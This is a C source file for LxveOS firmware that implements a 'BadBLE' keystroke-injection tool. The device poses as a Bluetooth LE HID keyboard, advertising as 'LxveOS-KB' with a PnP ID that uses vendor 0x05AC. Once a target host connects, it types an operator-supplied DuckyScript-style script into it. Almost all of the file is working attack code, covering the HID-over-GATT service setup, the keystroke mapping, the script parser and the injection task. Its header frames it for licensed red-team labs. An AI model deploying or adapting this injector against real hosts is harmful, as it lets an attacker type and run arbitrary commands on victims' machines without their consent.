// LxveOS BLE HID keystroke injection (the `ble_hid_inject` op) — a "BadBLE" red-team tool for the owner's
// licensed lab. LxveOS advertises as a standard Bluetooth-LE HID keyboard (HID-over-GATT / HOGP); when a
// target host connects and subscribes to the input report, LxveOS plays an operator-supplied keystroke
// script into it (type text, press Enter, open the run box, etc.) — the same primitive as a USB Rubber
// Ducky, over BLE.
//
// This is an OFFENSIVE-TX op: advertising + input-report notifications put energy on-air, so a start is
// gated on the arm framework (lxveos_arm_can_emit() must be true). It is NOT a jammer or a spam/advert
// flood: only the connectable PERIPHERAL role is enabled (the non-connectable broadcaster role — what BLE
// advert-spam uses — stays compiled out), and injection targets exactly one host that connected to us.
//
// NimBLE is a process-wide singleton owned by lxveos_ble.c (the passive scanner). The HID GATT services
// are registered from inside that one host bring-up via lxveos_ble_hid_services_register(); everything
// here (advertising, connection handling, the injection task) runs only once an operator arms + starts.
#include "lxveos_ble.h"
#include "lxveos_ble_hid_internal.h"
#include "lxveos_arm.h"

#include <string.h>
#include <strings.h>
#include <stdlib.h>

#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "nimble/ble.h"
#include "os/os_mbuf.h"
#include "host/ble_hs.h"
#include "host/ble_hs_adv.h"
#include "host/ble_att.h"
#include "host/ble_uuid.h"
#include "host/ble_gap.h"
#include "host/ble_gatt.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

static const char *TAG = "lxveos_hid";

// ── GATT UUIDs (16-bit, HID-over-GATT profile) ──────────────────────────────────────────────────────
// In the service/characteristic/descriptor tables a UUID field is a `const ble_uuid_t *`, so the entries
// use BLE_UUID16_DECLARE (a pointer to a static compound literal); the advertising field wants an actual
// ble_uuid16_t object and uses BLE_UUID16_INIT.
#define U16(v)  BLE_UUID16_DECLARE(v)
#define SVC_HID              0x1812u
#define SVC_DEVINFO          0x180Au
#define CHR_HID_INFO         0x2A4Au
#define CHR_REPORT_MAP       0x2A4Bu
#define CHR_HID_CTRL_POINT   0x2A4Cu
#define CHR_REPORT           0x2A4Du
#define CHR_PROTOCOL_MODE    0x2A4Eu
#define DSC_REPORT_REF       0x2908u
#define CHR_PNP_ID           0x2A50u

// Standard boot-keyboard HID report descriptor, report ID 1 -> 8-byte input reports [mods, resv, k1..k6].
static const uint8_t HID_REPORT_MAP[] = {
    0x05, 0x01,        // Usage Page (Generic Desktop)
    0x09, 0x06,        // Usage (Keyboard)
    0xA1, 0x01,        // Collection (Application)
    0x85, 0x01,        //   Report ID (1)
    0x05, 0x07,        //   Usage Page (Keyboard/Keypad)
    0x19, 0xE0,        //   Usage Minimum (Left Control)
    0x29, 0xE7,        //   Usage Maximum (Right GUI)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x01,        //   Logical Maximum (1)
    0x75, 0x01,        //   Report Size (1)
    0x95, 0x08,        //   Report Count (8)
    0x81, 0x02,        //   Input (Data,Var,Abs) — modifier byte
    0x95, 0x01,        //   Report Count (1)
    0x75, 0x08,        //   Report Size (8)
    0x81, 0x01,        //   Input (Const) — reserved byte
    0x95, 0x06,        //   Report Count (6)
    0x75, 0x08,        //   Report Size (8)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x65,        //   Logical Maximum (101)
    0x05, 0x07,        //   Usage Page (Keyboard/Keypad)
    0x19, 0x00,        //   Usage Minimum (0)
    0x29, 0x65,        //   Usage Maximum (101)
    0x81, 0x00,        //   Input (Data,Array) — 6-key rollover array
    0xC0               // End Collection
};

// HID Information: bcdHID 0x0111, country 0, flags 0x01 (RemoteWake).
static const uint8_t HID_INFO[] = {0x11, 0x01, 0x00, 0x01};
// Report Reference descriptor value: report ID 1, type 1 (Input).
static const uint8_t REPORT_REF[] = {0x01, 0x01};
// PnP ID: vendor source 0x02 (USB-IF), VID 0x05AC, PID 0x820A, version 0x0001 — a generic BLE keyboard id.
static const uint8_t PNP_ID[] = {0x02, 0xAC, 0x05, 0x0A, 0x82, 0x01, 0x00};
static const uint8_t PROTOCOL_MODE_REPORT = 0x01;

// ── module state (touched by the REPL task and the NimBLE host task) ─────────────────────────────────
static uint16_t s_report_val_handle;          // value handle of the input-report characteristic
static volatile uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static volatile bool     s_subscribed;         // target enabled notifications on the input report
static volatile bool     s_running;            // advertising or injecting
static SemaphoreHandle_t s_ready_sem;          // given when the target subscribes
static TaskHandle_t      s_task;
static char              s_script[256];
static uint8_t           s_own_addr_type;

// ── GATT access callbacks ────────────────────────────────────────────────────────────────────────────
static int chr_read_flat(struct ble_gatt_access_ctxt *ctxt, const void *data, uint16_t len)
{
    int rc = os_mbuf_append(ctxt->om, data, len);
    return rc == 0 ? 0 : BLE_ATT_ERR_INSUFFICIENT_RES;
}

static int access_report_map(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)arg;
    return chr_read_flat(ctxt, HID_REPORT_MAP, sizeof(HID_REPORT_MAP));
}
static int access_hid_info(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)arg;
    return chr_read_flat(ctxt, HID_INFO, sizeof(HID_INFO));
}
static int access_report(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)arg;
    // Reads return an empty (all-keys-up) report; writes (output reports, e.g. LED state) are ignored.
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR) {
        static const uint8_t empty[8] = {0};
        return chr_read_flat(ctxt, empty, sizeof(empty));
    }
    return 0;
}
static int access_report_ref(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)arg;
    return chr_read_flat(ctxt, REPORT_REF, sizeof(REPORT_REF));
}
static int access_ctrl_point(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)ctxt; (void)arg;
    return 0;  // suspend/exit-suspend — nothing to do
}
static int access_protocol_mode(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)arg;
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR) {
        return chr_read_flat(ctxt, &PROTOCOL_MODE_REPORT, 1);
    }
    return 0;
}
static int access_pnp(uint16_t ch, uint16_t ah, struct ble_gatt_access_ctxt *ctxt, void *arg)
{
    (void)ch; (void)ah; (void)arg;
    return chr_read_flat(ctxt, PNP_ID, sizeof(PNP_ID));
}

// The report characteristic carries a Report Reference descriptor (its CCCD is auto-added by NimBLE for
// the NOTIFY flag). The other characteristics are plain reads/writes.
static const struct ble_gatt_dsc_def report_dscs[] = {
    { .uuid = U16(DSC_REPORT_REF), .att_flags = BLE_ATT_F_READ, .access_cb = access_report_ref },
    { 0 },
};

static const struct ble_gatt_chr_def hid_chrs[] = {
    { .uuid = U16(CHR_REPORT_MAP),     .access_cb = access_report_map,   .flags = BLE_GATT_CHR_F_READ },
    { .uuid = U16(CHR_HID_INFO),       .access_cb = access_hid_info,     .flags = BLE_GATT_CHR_F_READ },
    { .uuid = U16(CHR_HID_CTRL_POINT), .access_cb = access_ctrl_point,   .flags = BLE_GATT_CHR_F_WRITE_NO_RSP },
    { .uuid = U16(CHR_PROTOCOL_MODE),  .access_cb = access_protocol_mode,
      .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_WRITE_NO_RSP },
    { .uuid = U16(CHR_REPORT),         .access_cb = access_report,       .descriptors = report_dscs,
      .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY, .val_handle = &s_report_val_handle },
    { 0 },
};

static const struct ble_gatt_chr_def devinfo_chrs[] = {
    { .uuid = U16(CHR_PNP_ID), .access_cb = access_pnp, .flags = BLE_GATT_CHR_F_READ },
    { 0 },
};

static const struct ble_gatt_svc_def hid_svcs[] = {
    { .type = BLE_GATT_SVC_TYPE_PRIMARY, .uuid = U16(SVC_HID),     .characteristics = hid_chrs },
    { .type = BLE_GATT_SVC_TYPE_PRIMARY, .uuid = U16(SVC_DEVINFO), .characteristics = devinfo_chrs },
    { 0 },
};

int lxveos_ble_hid_services_register(void)
{
    static bool done;
    if (done) {
        return 0;
    }
    ble_svc_gap_init();
    ble_svc_gatt_init();
    int rc = ble_gatts_count_cfg(hid_svcs);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gatts_count_cfg rc=%d", rc);
        return rc;
    }
    rc = ble_gatts_add_svcs(hid_svcs);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gatts_add_svcs rc=%d", rc);
        return rc;
    }
    ble_svc_gap_device_name_set("LxveOS-KB");
    ble_svc_gap_device_appearance_set(0x03C1);  // HID keyboard
    done = true;
    return 0;
}

// ── keystroke map (US layout) ────────────────────────────────────────────────────────────────────────
#define MOD_LSHIFT 0x02
// HID usage IDs for punctuation on a US keyboard.
static bool ascii_to_hid(char c, uint8_t *mod, uint8_t *key)
{
    *mod = 0;
    *key = 0;
    if (c >= 'a' && c <= 'z') { *key = 0x04 + (c - 'a'); return true; }
    if (c >= 'A' && c <= 'Z') { *mod = MOD_LSHIFT; *key = 0x04 + (c - 'A'); return true; }
    if (c >= '1' && c <= '9') { *key = 0x1E + (c - '1'); return true; }
    if (c == '0') { *key = 0x27; return true; }
    switch (c) {
    case ' ':  *key = 0x2C; return true;
    case '\n': *key = 0x28; return true;  // Enter
    case '\t': *key = 0x2B; return true;  // Tab
    case '-':  *key = 0x2D; return true;
    case '_':  *mod = MOD_LSHIFT; *key = 0x2D; return true;
    case '=':  *key = 0x2E; return true;
    case '+':  *mod = MOD_LSHIFT; *key = 0x2E; return true;
    case '[':  *key = 0x2F; return true;
    case '{':  *mod = MOD_LSHIFT; *key = 0x2F; return true;
    case ']':  *key = 0x30; return true;
    case '}':  *mod = MOD_LSHIFT; *key = 0x30; return true;
    case '\\': *key = 0x31; return true;
    case '|':  *mod = MOD_LSHIFT; *key = 0x31; return true;
    case ';':  *key = 0x33; return true;
    case ':':  *mod = MOD_LSHIFT; *key = 0x33; return true;
    case '\'': *key = 0x34; return true;
    case '"':  *mod = MOD_LSHIFT; *key = 0x34; return true;
    case '`':  *key = 0x35; return true;
    case '~':  *mod = MOD_LSHIFT; *key = 0x35; return true;
    case ',':  *key = 0x36; return true;
    case '<':  *mod = MOD_LSHIFT; *key = 0x36; return true;
    case '.':  *key = 0x37; return true;
    case '>':  *mod = MOD_LSHIFT; *key = 0x37; return true;
    case '/':  *key = 0x38; return true;
    case '?':  *mod = MOD_LSHIFT; *key = 0x38; return true;
    case '!':  *mod = MOD_LSHIFT; *key = 0x1E; return true;
    case '@':  *mod = MOD_LSHIFT; *key = 0x1F; return true;
    case '#':  *mod = MOD_LSHIFT; *key = 0x20; return true;
    case '$':  *mod = MOD_LSHIFT; *key = 0x21; return true;
    case '%':  *mod = MOD_LSHIFT; *key = 0x22; return true;
    case '^':  *mod = MOD_LSHIFT; *key = 0x23; return true;
    case '&':  *mod = MOD_LSHIFT; *key = 0x24; return true;
    case '*':  *mod = MOD_LSHIFT; *key = 0x25; return true;
    case '(':  *mod = MOD_LSHIFT; *key = 0x26; return true;
    case ')':  *mod = MOD_LSHIFT; *key = 0x27; return true;
    default:   return false;
    }
}

// A named key for the script command words (ENTER, TAB, GUI r, ...). Returns HID usage or 0 if unknown.
static uint8_t named_key(const char *name)
{
    if (!strcasecmp(name, "ENTER") || !strcasecmp(name, "RETURN")) return 0x28;
    if (!strcasecmp(name, "TAB"))    return 0x2B;
    if (!strcasecmp(name, "ESC") || !strcasecmp(name, "ESCAPE")) return 0x29;
    if (!strcasecmp(name, "SPACE"))  return 0x2C;
    if (!strcasecmp(name, "BACKSPACE") || !strcasecmp(name, "BKSP")) return 0x2A;
    if (!strcasecmp(name, "DELETE") || !strcasecmp(name, "DEL")) return 0x4C;
    if (!strcasecmp(name, "UP"))     return 0x52;
    if (!strcasecmp(name, "DOWN"))   return 0x51;
    if (!strcasecmp(name, "LEFT"))   return 0x50;
    if (!strcasecmp(name, "RIGHT"))  return 0x4F;
    if (!strcasecmp(name, "HOME"))   return 0x4A;
    if (!strcasecmp(name, "END"))    return 0x4D;
    if (name[0] >= 'a' && name[0] <= 'z' && name[1] == '\0') return 0x04 + (name[0] - 'a');
    if (name[0] >= 'A' && name[0] <= 'Z' && name[1] == '\0') return 0x04 + (name[0] - 'A');
    return 0;
}

// ── report transmission ──────────────────────────────────────────────────────────────────────────────
static int send_report(uint8_t mod, uint8_t key)
{
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE || !s_subscribed) {
        return BLE_HS_ENOTCONN;
    }
    if (!lxveos_arm_can_emit()) {   // re-check the arm gate before every keystroke
        return BLE_HS_EAPP;
    }
    uint8_t rpt[8] = {mod, 0, key, 0, 0, 0, 0, 0};
    struct os_mbuf *om = ble_hs_mbuf_from_flat(rpt, sizeof(rpt));
    if (om == NULL) {
        return BLE_HS_ENOMEM;
    }
    return ble_gatts_notify_custom(s_conn_handle, s_report_val_handle, om);
}

// Press then release one key (with modifiers). ~12 ms hold + gap so hosts register each keystroke.
static void tap(uint8_t mod, uint8_t key)
{
    send_report(mod, key);
    vTaskDelay(pdMS_TO_TICKS(12));
    send_report(0, 0);
    vTaskDelay(pdMS_TO_TICKS(12));
}

static void type_text(const char *s)
{
    for (; *s; s++) {
        uint8_t mod, key;
        if (ascii_to_hid(*s, &mod, &key)) {
            tap(mod, key);
        }
    }
}

// Match one modifier word to its bit, or 0 if not a modifier.
static uint8_t modifier_bit(const char *tok)
{
    if (!strcasecmp(tok, "CTRL") || !strcasecmp(tok, "CONTROL")) return 0x01;
    if (!strcasecmp(tok, "SHIFT")) return 0x02;
    if (!strcasecmp(tok, "ALT"))   return 0x04;
    if (!strcasecmp(tok, "GUI") || !strcasecmp(tok, "WIN") || !strcasecmp(tok, "CMD")) return 0x08;
    return 0;
}

// Parse "CTRL", "ALT", "GUI", "SHIFT", "CTRL-ALT" ... into a modifier byte. Returns 0 if `w` is not made
// up entirely of modifier words joined by '-'. Splits manually (no strtok) because the caller is already
// iterating with strtok — a nested strtok would clobber that state.
static uint8_t modifier_of(const char *w)
{
    uint8_t m = 0;
    char seg[16];
    size_t n = 0;
    for (const char *p = w;; p++) {
        if (*p == '-' || *p == '\0') {
            if (n == 0) {
                return 0;                 // empty segment -> not a clean modifier expression
            }
            seg[n] = '\0';
            uint8_t b = modifier_bit(seg);
            if (b == 0) {
                return 0;                 // a segment that is not a modifier word
            }
            m |= b;
            n = 0;
            if (*p == '\0') {
                break;
            }
        } else if (n < sizeof(seg) - 1) {
            seg[n++] = *p;
        } else {
            return 0;                     // segment too long to be a modifier word
        }
    }
    return m;
}

// Run one DuckyScript-lite line. Commands are separated by ';' in the script string.
//   STRING <text> · ENTER · TAB · ESC · SPACE · DELAY <ms> · GUI [key] · CTRL <key> · ALT <key> ·
//   SHIFT <key> · CTRL-ALT <key> · <NAMEDKEY>
static void run_line(char *line)
{
    while (*line == ' ') line++;
    if (*line == '\0') {
        return;
    }
    // STRING keeps the rest of the line verbatim (spaces preserved).
    if (!strncasecmp(line, "STRING ", 7)) {
        type_text(line + 7);
        return;
    }
    if (!strcasecmp(line, "STRING")) {
        return;
    }
    // Otherwise tokenise: first word is a command/modifier/named key.
    char work[192];
    strncpy(work, line, sizeof(work) - 1);
    work[sizeof(work) - 1] = '\0';
    char *w = strtok(work, " ");
    if (w == NULL) {
        return;
    }
    if (!strcasecmp(w, "DELAY")) {
        char *ms = strtok(NULL, " ");
        int d = ms ? atoi(ms) : 100;
        if (d < 0) d = 0;
        if (d > 10000) d = 10000;
        vTaskDelay(pdMS_TO_TICKS(d));
        return;
    }
    uint8_t mod = modifier_of(w);
    if (mod != 0) {
        char *k = strtok(NULL, " ");
        uint8_t key = 0;
        if (k != NULL) {
            uint8_t ignore;
            if (!ascii_to_hid(k[0], &ignore, &key) || k[1] != '\0') {
                key = named_key(k);
            }
        }
        tap(mod, key);   // key may be 0 for a bare GUI/modifier tap
        return;
    }
    uint8_t nk = named_key(w);
    if (nk != 0) {
        tap(0, nk);
    }
}

static void inject_task(void *arg)
{
    (void)arg;
    // Wait (up to 60 s) for a host to connect and subscribe to the input report.
    if (xSemaphoreTake(s_ready_sem, pdMS_TO_TICKS(60000)) != pdTRUE) {
        ESP_LOGW(TAG, "no host subscribed within 60s — stopping");
        lxveos_ble_hid_stop();
        s_task = NULL;
        vTaskDelete(NULL);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(400));  // let the connection settle before typing
    ESP_LOGI(TAG, "target subscribed — injecting script");

    // Play the script: split on ';'.
    char *save = NULL;
    char script[256];
    strncpy(script, s_script, sizeof(script) - 1);
    script[sizeof(script) - 1] = '\0';
    for (char *ln = strtok_r(script, ";", &save); ln != NULL; ln = strtok_r(NULL, ";", &save)) {
        if (!lxveos_arm_can_emit() || s_conn_handle == BLE_HS_CONN_HANDLE_NONE) {
            break;
        }
        run_line(ln);
    }
    ESP_LOGI(TAG, "injection complete");
    lxveos_ble_hid_stop();
    s_task = NULL;
    vTaskDelete(NULL);
}

// ── advertising + connection ─────────────────────────────────────────────────────────────────────────
static int hid_gap_event(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            ESP_LOGI(TAG, "host connected (conn=%d)", s_conn_handle);
        } else {
            // Connection attempt failed; advertising has stopped. The inject task's 60s wait will lapse
            // and tear the op down — no re-advertise here (keeps the GAP callback allocation-free).
            ESP_LOGW(TAG, "connect failed (status=%d)", event->connect.status);
        }
        return 0;
    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "host disconnected (reason=%d)", event->disconnect.reason);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        s_subscribed = false;
        return 0;
    case BLE_GAP_EVENT_SUBSCRIBE:
        if (event->subscribe.attr_handle == s_report_val_handle && event->subscribe.cur_notify) {
            s_subscribed = true;
            if (s_ready_sem != NULL) {
                xSemaphoreGive(s_ready_sem);
            }
        }
        return 0;
    default:
        return 0;
    }
}

static int start_advertising(void)
{
    struct ble_hs_adv_fields fields = {0};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.appearance = 0x03C1;              // HID keyboard
    fields.appearance_is_present = 1;
    fields.name = (uint8_t *)"LxveOS-KB";
    fields.name_len = 9;
    fields.name_is_complete = 1;
    static ble_uuid16_t hid_uuid = BLE_UUID16_INIT(SVC_HID);
    fields.uuids16 = &hid_uuid;
    fields.num_uuids16 = 1;
    fields.uuids16_is_complete = 1;

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        ESP_LOGE(TAG, "adv_set_fields rc=%d", rc);
        return rc;
    }
    struct ble_gap_adv_params adv = {0};
    adv.conn_mode = BLE_GAP_CONN_MODE_UND;   // connectable
    adv.disc_mode = BLE_GAP_DISC_MODE_GEN;   // general discoverable
    rc = ble_gap_adv_start(s_own_addr_type, NULL, BLE_HS_FOREVER, &adv, hid_gap_event, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "adv_start rc=%d", rc);
    }
    return rc;
}

esp_err_t lxveos_ble_hid_inject(const char *script)
{
    if (script == NULL || script[0] == '\0') {
        return ESP_ERR_INVALID_ARG;
    }
    if (!lxveos_arm_can_emit()) {
        return ESP_ERR_NOT_ALLOWED;      // not armed / TX compiled out
    }
    if (s_running) {
        return ESP_ERR_INVALID_STATE;    // already advertising/injecting
    }
    esp_err_t herr = lxveos_ble_hid_host_ready(&s_own_addr_type);
    if (herr != ESP_OK) {
        return herr;
    }
    strncpy(s_script, script, sizeof(s_script) - 1);
    s_script[sizeof(s_script) - 1] = '\0';

    if (s_ready_sem == NULL) {
        s_ready_sem = xSemaphoreCreateBinary();
        if (s_ready_sem == NULL) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xSemaphoreTake(s_ready_sem, 0);  // drain any stale give
    }
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    s_subscribed = false;
    s_running = true;

    int rc = start_advertising();
    if (rc != 0) {
        s_running = false;
        return ESP_FAIL;
    }
    if (xTaskCreate(inject_task, "lxv_hid", 4096, NULL, 5, &s_task) != pdPASS) {
        lxveos_ble_hid_stop();
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "advertising as BLE keyboard 'LxveOS-KB' — waiting for a target to pair");
    return ESP_OK;
}

esp_err_t lxveos_ble_hid_stop(void)
{
    s_running = false;
    ble_gap_adv_stop();
    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    }
    s_subscribed = false;
    return ESP_OK;
}

bool lxveos_ble_hid_running(void)
{
    return s_running;
}

bool lxveos_ble_hid_connected(void)
{
    return s_conn_handle != BLE_HS_CONN_HANDLE_NONE;
}
